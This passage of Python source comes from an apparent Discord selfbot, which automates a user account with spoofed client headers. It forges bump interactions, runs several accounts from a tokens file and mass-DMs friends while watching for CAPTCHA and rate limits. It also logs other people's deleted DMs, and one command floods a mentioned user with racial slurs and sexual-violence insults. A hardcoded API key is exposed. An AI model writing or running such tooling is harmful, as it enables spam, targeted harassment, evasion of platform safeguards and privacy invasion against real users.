        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    }

    payload = {
        "type": 2,
        "application_id": "302050872383242240", 
        "channel_id": str(ctx.channel.id),
        "guild_id": str(ctx.guild.id),
        "session_id": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
        "data": {
            "version": "1051151064008769576", 
            "id": "947088344167366698",
            "name": "bump",
            "type": 1,
            "options": [],
            "application_command": {
                "id": "947088344167366698",
                "application_id": "302050872383242240", 
                "version": "1051151064008769576", 
                "name": "bump",
                "description": "Bump this server.", 
                "description_default": "Pushes your server to the top of all your server's tags and the front page",
                "dm_permission": True,
                "type": 1
            }
        }
    }

    async def bump():
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 204:
                            print("Successfully bumped server")
                        else:
                            print(f"Failed to bump server: {resp.status}")
                
                await asyncio.sleep(7200) 
            except Exception as e:
                print(f"Error during bump: {e}")
                await asyncio.sleep(60)  

    await ctx.send("```Starting auto bump. run '.autobumpoff' to stop```")
    bump_task = bot.loop.create_task(bump())

@bot.command() 
@require_password()
async def autobumpoff(ctx):
    global bump_task
    
    if bump_task is None:
        await ctx.send("```Auto bump is not currently running```")
        return
        
    bump_task.cancel()
    bump_task = None
    await ctx.send("```Auto bump stopped```")

@bot.command()
@require_password()
async def lOl(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await lOl_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def lOl_user(channel, user):
    try:
        await channel.send(f"HOLY{user.mention}")
        await asyncio.sleep(0.615)
        await channel.send(f"# LOLOLOLOLOL{user.mention}")
        await asyncio.sleep(0.08135)
        await channel.send(f"# UR DYINGH{user.mention}")
        await asyncio.sleep(0.6156)
        await channel.send(f"# TOOOO{user.mention}")
        await asyncio.sleep(0.7156)
        await channel.send(f"# FUCKIGN {user.mention}")
        await asyncio.sleep(0.4156)
        await channel.send(f"# MANUAL{user.mention}")
        await asyncio.sleep(0.61456)
        await channel.send(f" LADDER{user.mention}")
        await asyncio.sleep(0.8)
        await channel.send(f"# DONTT {user.mention}")
        await asyncio.sleep(0.5)
        await channel.send(f" STPE{user.mention}")
        await asyncio.sleep(0.4)
        await channel.send(f"# TO{user.mention}")
        await asyncio.sleep(0.41495)
        await channel.send(f"# yur{user.mention}")
        await asyncio.sleep(0.81452)
        await channel.send(f"# GOD LOLOL{user.mention}")
        await asyncio.sleep(1.211)
        await channel.send(f"# WE CAN MANUAL FOR HOURS?{user.mention}")
        await asyncio.sleep(0.6145)
        await channel.send(f"# DAYS?{user.mention}")
        await asyncio.sleep(0.51442)
        await channel.send(f"# WEEKS?{user.mention}")
        await asyncio.sleep(0.7142)
        await channel.send(f"# MONTHS{user.mention}")
        await asyncio.sleep(1.21)
        await channel.send(f"# FUCK  RAPED UNIGGER BOY{user.mention}")
        await asyncio.sleep(0.61424)
        await channel.send(f"# HOLY {user.mention}")
        await asyncio.sleep(0.51424)
        await channel.send(f"ur{user.mention}")
        await asyncio.sleep(0.8531)
        await channel.send(f"Gettng{user.mention}")
        await asyncio.sleep(0.4021)
        await channel.send(f"out{user.mention}")
        await asyncio.sleep(0.742)
        await channel.send(f"ladderedf{user.mention}")
        await asyncio.sleep(0.5342)
        await channel.send(f"TO{user.mention}")
        await asyncio.sleep(0.521)
        await channel.send(f"fcuckk{user.mention}")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")
        
        
last_message_time = {}  # Store the last message time for each tracked user
mode_6_active = False  # Track if mode 6 is active
last_mode_6_response_time = {}  




import discord
import asyncio
import requests
import random

# Constants and initializations
DISCORD_API_URL_SINGLE = "https://discord.com/api/v9/users/@me/settings"
status_delay900 = {}  # Delay per token position
active_clients900 = {}  # Active clients per token position
status_lists900 = {}  # Status lists per token position

class MultiStatusClient900(discord.Client):
    def __init__(self, token, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token900 = token
        self.position900 = position
        self.running900 = True  # Control loop for rotation

    async def update_status900(self, status_text):
        """Update the custom status."""
        change_single_custom_status(self.token900, status_text)

    async def rotate_statuses900(self):
        """Rotate through the statuses for this token indefinitely."""
        global status_delay900, status_lists900
        while self.running900:
            statuses = status_lists900.get(self.position900, [])
            delay = status_delay900.get(self.position900, 4)  # Default delay is 4 seconds
            for status in statuses:
                if not self.running900:
                    break
                await self.update_status900(status)
                await asyncio.sleep(delay)

    async def on_ready(self):
        print(f'Logged in as {self.user} with token ending in {self.token900[-4:]}')
        asyncio.create_task(self.rotate_statuses900())

    async def stop_rotation(self):
        """Stop the status rotation loop."""
        self.running900 = False
        await self.close()

def change_single_custom_status(token, status_text):
    """Send a request to Discord to update the custom status for the token."""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    payload = {
        "custom_status": {
            "text": status_text
        }
    }
    try:
        response = requests.patch(DISCORD_API_URL_SINGLE, headers=headers, json=payload)
        if response.status_code == 200:
            print(f"Successfully changed status to '{status_text}' for token ending in {token[-4:]}")
        else:
            print(f"Failed to change status. Status Code: {response.status_code}, Response: {response.text}")
    except requests.RequestException as e:
        print(f"Error while changing status for token ending in {token[-4:]}: {e}")

async def start_client_with_rotation900(token, position, statuses):
    """Log in the specified token and start rotating statuses for it."""
    global status_lists900, active_clients900
    status_lists900[position] = statuses  # Set status list for this token

    client = MultiStatusClient900(token, position, intents=discord.Intents.default())
    active_clients900[position] = client
    await client.start(token, bot=False)  # Start client

@bot.command()
@require_password()
async def s(ctx, position: int, *, statuses: str):
    """Set and start rotating the status for a specific token."""
    global active_clients900, status_lists900

    # Load tokens from a file
    tokens = read_tokens('tokens2.txt')

    # Check if position is valid (1-based index)
    if position < 1 or position > len(tokens):
        await ctx.send("Invalid position. Please provide a valid token position.")
        return

    # Parse and set the statuses
    statuses_list = [status.strip() for status in statuses.split(',')]
    token = tokens[position - 1]  # Adjust for 1-based index

    # Stop any existing client for this token if already running
    if position in active_clients900:
        await active_clients900[position].stop_rotation()
        del active_clients900[position]

    # Start new client with the specified statuses
    await start_client_with_rotation900(token, position, statuses_list)
    await ctx.send(f"Started rotating statuses for token {position}.")

@bot.command()
@require_password()
async def se(ctx, position: int):
    """Stop rotating statuses for a specific token."""
    global active_clients900

    # Check if client for this token position is active (1-based index)
    if position in active_clients900:
        await active_clients900[position].stop_rotation()
        del active_clients900[position]
        await ctx.send(f"Stopped rotating statuses for token {position}.")
    else:
        await ctx.send(f"No active status rotation found for token {position}.")

@bot.command()
@require_password()
async def sd(ctx, position: int, delay: int):
    """Change the delay between status updates for a specific token."""
    global status_delay900

    if delay > 0:
        status_delay900[position] = delay  # Set delay for this token (1-based index)
        await ctx.send(f"Status delay for token {position} changed to {delay} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")

def read_tokens(filename='tokens.txt'):
    """Read tokens from a file."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

# Global variables
reply_mode = 1
tracked_user_id = None
replying = False
jokes = load_jokes()
logging_enabled = False
log_file = "logs.txt"
message_log = []
last_message_time = {}  # Store the last message time for each tracked user
mode_6_active = False  # Track if mode 6 is active
last_mode_6_response_time = {}  

# Message Logger
@bot.command()
@require_password()
async def log(ctx, option):
    global logging_enabled
    if option == "on":
        logging_enabled = True
        await ctx.send("Logging for DMs and GCs has been turned ON.")
    elif option == "off":
        logging_enabled = False
        await ctx.send("Logging for DMs and GCs has been turned OFF.")
    else:
        await ctx.send("Invalid option! Use `log on` or `log off`.")

# Log deleted messages
@bot.event
async def on_message_delete(message):
    global logging_enabled

    # Log only in DMs and GCs
    if logging_enabled and (isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel)):
        log_entry = f"Message {len(message_log) + 1}: A message was deleted by {message.author} in {message.channel.name if message.guild else 'DM/GC'}\n"

        if message.content:
            log_entry += f"Content: {message.content}\n"

        if message.attachments:
            for attachment in message.attachments:
                log_entry += f"Attachment: {attachment.url}\n"

        message_log.append(log_entry)

        with open(log_file, "a") as f:
            f.write(log_entry)

        print(f"Logged: {log_entry.strip()}")

# Display the deleted message
@bot.command()
@require_password()
async def display(ctx, number: int):
    if 0 < number <= len(message_log):
        await ctx.send(message_log[number - 1])
    else:
        await ctx.send(f"No log found for number {number}. Check the range.")

# display the entire log file
@bot.command()
@require_password()
async def displaylog(ctx):
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_content = f.read()
        if log_content:
            await ctx.send(f"```{log_content}```")
        else:
            await ctx.send("The log is empty.")
    else:
        await ctx.send("Log file does not exist.")

# clear the log file
@bot.command()
@require_password()
async def clearlog(ctx):
    if os.path.exists(log_file):
        os.remove(log_file)
        message_log.clear()
        await ctx.send("Logs have been cleared.")
    else:
        await ctx.send("Log file does not exist.")

@bot.command()
@require_password()
async def unfriend(ctx, user):
    if isinstance(user, str):
        try:
            user_id = int(user)
            user_name = user
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return
    else:
        user_id = user.id
        user_name = user.name

    headers = {
        'Authorization': bot.http.token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }

    msg = await ctx.send(f"```Removing {user_name} from friends...```")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.delete(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers
            ) as resp:
                if resp.status == 204:
                    await msg.edit(content=f"```Successfully removed {user_name} from friends```")
                else:
                    await msg.edit(content=f"```Failed to remove {user_name} from friends. Status: {resp.status}```")
    except Exception as e:
        await msg.edit(content=f"```An error occurred: {str(e)}```")


@bot.command()
@require_password()
async def friend(ctx, user_id: str = None):
    if not user_id:
        await ctx.send("```Please provide a user ID```")
        return
    
    status_msg = await ctx.send("```Sending friend request...```")
    
    try:
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.7',
            'authorization': bot.http.token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'America/New_York',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3NlYXJjaC5icmF2ZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6InNlYXJjaC5icmF2ZS5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJkaXNjb3JkLmNvbSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM0NzY5OSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
                }

        async with aiohttp.ClientSession() as session:

            async with session.get(
                f'https://discord.com/api/v9/users/{user_id}/profile?with_mutual_guilds=false',
                headers=headers
            ) as resp:
                if resp.status != 200:
                    await status_msg.edit(content="```Failed to fetch user info```")
                    return
                user_data = await resp.json()
                username = user_data.get('user', {}).get('username', '')


            async with session.put(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers,
                json={}
            ) as resp:
                if resp.status in [204, 200]:
                    await status_msg.edit(content=f"```Successfully sent friend request to {username}```")
                elif resp.status == 429:
                    retry_after = float((await resp.json()).get('retry_after', 5))
                    await status_msg.edit(content=f"```Rate limited. Try again in {retry_after} seconds```")
                elif resp.status == 400:
                    response_data = await resp.text()
                    if "You need to verify your account" in response_data:
                        await status_msg.edit(content="```Account needs verification```")
                    else:
                        await status_msg.edit(content=f"```Failed to send friend request: {response_data}```")
                else:
                    await status_msg.edit(content=f"```Failed to send friend request (Status: {resp.status})```")

    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def fnick(ctx, user_id: str, *, nickname: str = None):
    if not user_id:
        await ctx.send("```Usage: .fnick <user_id> <nickname>```")
        return
    
    status_msg = await ctx.send("```Setting friend nickname...```")
    
    try:
        try:
            user_id = int(user_id)
        except ValueError:
            await status_msg.edit(content="```Invalid user ID```")
            return

        headers = {
            'Authorization': bot.http.token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
        }

        async with aiohttp.ClientSession() as session:
            async with session.get(
                'https://discord.com/api/v9/users/@me/relationships',
                headers=headers
            ) as resp:
                if resp.status != 200:
                    await status_msg.edit(content="```Failed to fetch relationships```")
                    return
                
                relationships = await resp.json()
                friend = next((r for r in relationships if str(r.get('user', {}).get('id')) == str(user_id)), None)
                
                if not friend:
                    await status_msg.edit(content="```This user is not in your friends list```")
                    return
                
                username = friend.get('user', {}).get('username', 'Unknown')

            payload = {
                "type": 1,
                "nickname": nickname if nickname else None
            }

            async with session.patch(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers,
                json=payload
            ) as resp:
                if resp.status in [200, 204]:
                    action = 'set' if nickname else 'removed'
                    await status_msg.edit(content=f"```Successfully {action} nickname for {username}```")
                elif resp.status == 429:
                    retry_after = float((await resp.json()).get('retry_after', 5))
                    await status_msg.edit(content=f"```Rate limited. Try again in {retry_after} seconds```")
                else:
                    error_text = await resp.text()
                    await status_msg.edit(content=f"```Failed to set nickname: {error_text}```")

    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")
@bot.command()
@require_password()
async def fnote(ctx, user_id: str, *, note: str = None):
    if not user_id:
        await ctx.send("```Usage: .fnote <user_id> <note>```")
        return
    
    status_msg = await ctx.send("```Setting friend note...```")
    
    try:
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.7',
            'authorization': bot.http.token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled'
        }

        payload = {"note": note} if note else {"note": ""}

        async with aiohttp.ClientSession() as session:
            async with session.put(
                f'https://discord.com/api/v9/users/@me/notes/{user_id}',
                headers=headers,
                json=payload
            ) as resp:
                if resp.status in [200, 204]:
                    await status_msg.edit(content=f"```Successfully {'set' if note else 'removed'} friend note```")
                else:
                    error_text = await resp.text()
                    await status_msg.edit(content=f"```Failed to set note: {error_text}```")

    except Exception as e:
        await status_msg.edit(content=f"```An error occurred: {str(e)}```")
        
        
STAT_RESPONSES = {
    'rizz_levels': ['-9999', '-∞', 'ERROR: NOT FOUND', 'Below Zero', 'Nonexistent', 'Windows 95'],
    'bitches': ['0', '-1', 'Negative', 'None', 'Error 404', 'Imaginary'],
    'grass_status': ['Never Touched', 'What is Grass?', 'Allergic', 'Grass Blocked', 'Touch Pending'],
    'karma_levels': ['-999', '-∞', 'Rock Bottom', 'Below Sea Level', 'Catastrophic'],
    'cringe_levels': ['Maximum', '∞%', 'Over 9000', 'Critical', 'Terminal', 'Beyond Science'],
    'final_ratings': ['MASSIVE L', 'CRITICAL FAILURE', 'TOUCH GRASS ASAP', 'SYSTEM FAILURE', 'FATAL ERROR'],
    

    'time_spent': ['25/8', '24/7/365', 'Unhealthy Amount', 'Too Much', 'Always Online'],
    'nitro_status': ['Begging for Gifted', 'None (Too Broke)', 'Expired', 'Using Fake Nitro'],
    'friend_types': ['All Bots', 'Discord Kittens', 'Fellow Basement Dwellers', 'Alt Accounts'],
    'pfp_types': ['Anime Girl', 'Genshin Character', 'Stolen Art', 'Discord Default'],
    
    'relationship_status': ['Discord Mod', 'Forever Alone', 'Dating Discord Bot', 'Married to Anime'],
    'dating_success': ['404 Not Found', 'Task Failed', 'Loading... (Never)', 'Error: No Data'],
    'red_flags': ['Too Many to Count', 'Infinite', 'Yes', 'All of Them', 'Database Full'],
    'dm_status': ['Left on Read', 'Blocked', 'Message Failed', 'Seen-zoned']
}
from random import randint, choice, uniform

@bot.command()
@require_password()
async def stats(ctx, user: discord.Member):
    loading = await ctx.send(f"```Loading stats for {user.name}...```")
    
    stats = f"""STATS FOR {user.name}:
    
Rizz Level: {choice(STAT_RESPONSES['rizz_levels'])}
Bitches: {choice(STAT_RESPONSES['bitches'])}
Grass Touched: {choice(STAT_RESPONSES['grass_status'])}
Discord Karma: {choice(STAT_RESPONSES['karma_levels'])}
Touch Grass Rating: {randint(0, 2)}/10
Cringe Level: {choice(STAT_RESPONSES['cringe_levels'])}
L's Taken: {randint(999, 9999)}+
W's Taken: {randint(-1, 0)}
    
FINAL RATING: {choice(STAT_RESPONSES['final_ratings'])}"""
    
    await asyncio.sleep(2)
    await loading.edit(content=f"```{stats}```")
        
@bot.command()
@require_password()
async def dripcheck(ctx, user: discord.Member):
    loading = await ctx.send(f"```Analyzing {user.name}'s drip...```")
    
    UNSPLASH_ACCESS_KEY = "KOKZn5RF1jHrAUyaj3Q5c2FaKFpGCv5iaZhACmFnWLs"
    search_terms = ["bad fashion", "worst outfit", "terrible clothes", "weird clothing"]
    
    try:
        async with aiohttp.ClientSession() as session:
            search_term = random.choice(search_terms)
            url = f"https://api.unsplash.com/photos/random?query={search_term}&client_id={UNSPLASH_ACCESS_KEY}"
            
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    image_url = data['urls']['regular']
                    
                    report = f"""DRIP INSPECTION FOR {user.name}:

Drip Level: Sahara Desert
Style Rating: Windows 95
Outfit Score: Walmart Clearance
Swag Meter: Empty
Freshness: Expired
Trend Rating: Internet Explorer
Fashion Sense: Colorblind
    
DRIP STATUS: CRITICALLY DRY
RECOMMENDATION: FACTORY RESET

Actual Fit Reference: 👇"""
                    
                    await loading.edit(content=f"```{report}```")
                    await ctx.send(image_url)
                else:
                    await loading.edit(content=f"```{report}```")
    except Exception as e:
        print(f"Error fetching image: {e}")
        await loading.edit(content=f"```{report}```")
        
@bot.command()
@require_password()
async def discordreport(ctx, user: discord.Member):
    loading = await ctx.send(f"```Generating Discord report card for {user.name}...```")
    
    report = f"""DISCORD REPORT CARD FOR {user.name}:

Time Spent: {choice(STAT_RESPONSES['time_spent'])}
Grass Touched: {choice(STAT_RESPONSES['grass_status'])}
Discord Nitro: {choice(STAT_RESPONSES['nitro_status'])}
Server Count: {randint(100, 999)}
DMs: {choice(['Empty', 'All Blocked', 'Only Bots', 'Bot Spam'])}
Friends: {choice(STAT_RESPONSES['friend_types'])}
Profile Picture: {choice(STAT_RESPONSES['pfp_types'])}
Custom Status: {choice(['Cringe', 'Bot Generated', 'Anime Quote', 'Discord Kitten'])}
    
FINAL GRADE: F{'-' * randint(1, 5)}
NOTE: {choice(['Parents Disowned', 'Touch Grass Immediately', 'Seek Help', 'Grass is Green'])}"""
    
    await asyncio.sleep(2)
    await loading.edit(content=f"```{report}```")


from datetime import timedelta


    






@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You don't have permission to use this command.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Nigga put every necessary details then it will work retard fuck")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("Member not found.")
    else:
        await ctx.send(f"An error occurred: {error}")
    
     

@bot.command()
@require_password()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member_name: str):
    """Unban a member from the server."""
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member_name.split('#')

    for ban_entry in banned_users:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"Unbanned {user.mention}")
            return
    await ctx.send(f"User {member_name}#{member_discriminator} not found.")
    
    
@bot.command()
@require_password()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member, *, reason: str = None):
    """Mute a member."""
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted By Apop")
    if not mute_role:
        mute_role = await ctx.guild.create_role(name="Muted By Apop")
        for channel in ctx.guild.channels:
            await channel.set_permissions(mute_role, speak=False, send_messages=False)

    await member.add_roles(mute_role, reason=reason)
    await ctx.send(f"{member.mention} has been muted. Reason: {reason if reason else 'No reason provided.'}")


@bot.command()
@require_password()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    """Unmute a member."""
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if mute_role in member.roles:
        await member.remove_roles(mute_role)
        await ctx.send(f"{member.mention} has been unmuted.")
    else:
        await ctx.send(f"{member.mention} is not muted.")

editting = False       
       
@bot.command()
@require_password()
async def autoedit(ctx):
    global editting
    editting = True
    await ctx.send("auto editting enabled")
    
@bot.command()
@require_password()
async def autoeditoff(ctx):
    global editting
    editting = False
    await ctx.send("auto editting disabled")


@bot.command(name='crypto')
@require_password()
async def get_crypto_price(ctx, symbol: str):
    try:
        # Fetch data from CoinGecko API
        response = requests.get(f'https://api.coingecko.com/api/v3/simple/price?ids={symbol.lower()}&vs_currencies=usd')
        data = response.json()
        
        if symbol.lower() in data:
            price = data[symbol.lower()]['usd']
            await ctx.send(f'The current price of {symbol.upper()} is ${price:.2f} USD.')
        else:
            await ctx.send('Invalid cryptocurrency symbol or data not found.')

    except Exception as e:
        await ctx.send('An error occurred while fetching the cryptocurrency data.')








@bot.command()
@require_password()
async def mdm(ctx, num_friends: int, *, message: str):
    await ctx.message.delete()
    
    async def send_message_to_friend(friend_id, friend_username):
        headers = {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com/",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "Asia/Calcutta",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://discord.com/api/v9/users/@me/channels",
                    headers=headers,
                    json={"recipient_id": friend_id}
                ) as response:
                    if response.status == 403:
                        data = await response.json()
                        if "captcha_key" in data or "captcha_sitekey" in data:
                            print(f"CAPTCHA detected! Stopping mass DM...")
                            return False, "CAPTCHA"
                            
                    if response.status == 200:
                        dm_channel = await response.json()
                        channel_id = dm_channel["id"]
                        
                        async with session.post(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages",
                            headers=headers,
                            json={"content": message}
                        ) as msg_response:
                            if msg_response.status == 403:
                                data = await msg_response.json()
                                if "captcha_key" in data or "captcha_sitekey" in data:
                                    return False, "CAPTCHA"
                                return False, "BLOCKED"
                            elif msg_response.status == 429:
                                return False, "RATELIMIT"
                            elif msg_response.status == 200:
                                return True, "SUCCESS"
                            else:
                                return False, f"ERROR_{msg_response.status}"
                                
